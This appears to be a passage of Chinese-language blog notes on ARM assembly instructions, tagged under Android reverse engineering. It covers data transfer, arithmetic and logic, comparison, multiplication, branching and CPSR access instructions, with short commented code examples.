数据处理类指令\n\n### 2.2.1 数据传送指令\n\n```asm\nMOV R1,R0\t\t\t;R1 <- R0\nMOV R1,R0,LSL #3\t;R1 <- R0*8\nMVN R0,#0\t\t\t;立即数0取反传送至R0，R0=-1\n```\n\n### 2.2.2 算数逻辑运算指令\n\n例1：64位整数加法\n\nR0/R1与R2/R3分别存放两个加数的低/高32位，R4/R5存放结果的低/高32位。\n\n```asm\nADDS R4,R0,R2\t;带S后缀结果影响CPSR的标志位C\nADC R5,R1,R3\t;带进位的加法，C标志位参与运算\n```\n\n例2：64位整数减\n\n```ASM\nSUBS R4,R0,R2\nSBC R5,R1,R3\n```\n\n例3：逆向减法\n\n```asm\nRSB R0,R1,R2\t;R0=R2-R1\nRSC R0,R1,R2\t;在上行指令基础上再减C标志位的反码\n```\n\n例4：逻辑运算\n\n```asm\nAND R0,R0,#3\t;保持R0的0、1位，其余清零\nORR R0,R0,#3\t;置位R0的0、1位，其余不变\nEOR R0,R0,#3\t;反转R0的0、1位，其余不变\nBIC R0,R0,#3\t;清零R0的0、1位，其余不变\n```\n\n例5：比较指令\n\n```asm\nCMP R1,R0\t;R1-R0，结果影响CPSR中的标志位，但不保留运算结果\nCMN R0,#1\t;判断R0的值是否为1的补码，是则Z置位\n;CMN指令将操作1寄存器减去操作数2的负值\n```\n\n例6：测试指令\n\n```asm\nTST R1,#3\t;按位与，结果影响CPSR中的标志位\nTEQ R1,R2\t;按位异或，结果影响CPSR中的标志位\n```\n\n上述比较与测试指令可与带S后缀的算数逻辑运算指令对比，如TEQ与EORS对比，其运算操作一致，但运算指令保留结果，比较测试指令只修改CPSR中标志位，不保留运算结果。\n\n例7：乘法指令\n\nMUL：32位乘法\n\nMLA：三操作数乘法，将操作数1与操作数2相乘，结果加第三个操作数，存入目的寄存器\n\n```asm\nMLA Rd,Rm,Rs,Rn\t\t\t;Rd <- Rm*Rs+Rn\n```\n\n规则：Rd和Rm不能是同一寄存器\n\n形成两个矢量的标量积的例子：\n\n```asm\n\tmov r11,#20\t\t\t\t;r11 <- 20\n\tmov r10,#0\t\t\t\t;r10 <- 0\nloop:\n\tldr r0,[r8],#4\t\t\t;r0 <- mem32[r8]\n\t\t\t\t\t\t\t;r8 <- r8 + 4\n\tldr r1,[r9],#4\t\t\t;r1 <- mem32[r9]\n\t\t\t\t\t\t\t;r9 <- r9 + 4\n\tmla r10,r0,r1,r10\t\t;r10 <- r0*r1+r10\n\tsubs r11,r11,#1\t\t\t;r11 <- r11 - 1\n\tbne loop\t\t\t\t;在Z标志位为0时跳转执行\n```\n\n### 2.2.3 数据交换指令\n\n```asm\nSWP R1,R1[R0]\t\t;需要中间人\n```\n\n## 2.3 跳转指令\n\n跳转指令用于控制程序的走向，可完成从当前指令向前或向后的32MB的地址空间跳转，包括基本跳转指令(无条件跳转)B，带返回的跳转指令BL，带状态切换(ARM与Thumb之间)的跳转指令BX，带返回和状态切换的跳转指令BLX。\n\nARM指令地址间隔为4，Thumb指令地址间隔为2。\n\n例：\n\n```asm\nBL LABEL\t;程序无条件跳转至LABEL处执行\n\t\t\t;同时将当前的PC值保存至R14中\n\n用B指令完成类似功能\nMOV LR,PC\nB LABEL\n```\n\n跳转范围不受限制的方式：\n\n```asm\nLDR PC,=LABEL\n```\n\nBEQ：相等就跳\n\nNEQ：不相等就跳\n\n## 2.4 程序状态寄存器访问指令\n\n当前程序状态寄存器可分为4个8位独立域：\n\n```asm\nCPSR[31:24]：_f(标志域)\nCPSR[23:16]：_s(状态域)\nCPSR[15:8]：_x(扩展域)\nCPSR[7:0]：_c(控制域)\n```\n\n例：清CPSR标志位，先读到寄存器里去再进行修改，修改完后用MSR指令赋值给标志位。\n\n```asm\nMRS R0,CPSR\t\t;R0 <- CPSR\nBIC R0,R0,#0xF0000000\t;清高四位\nMSR CPSR_f,R0\t\t;CPSR_f <- R0\n```\n\n","categories":["Android逆向"],"tags":["Reverse","汇编"]}]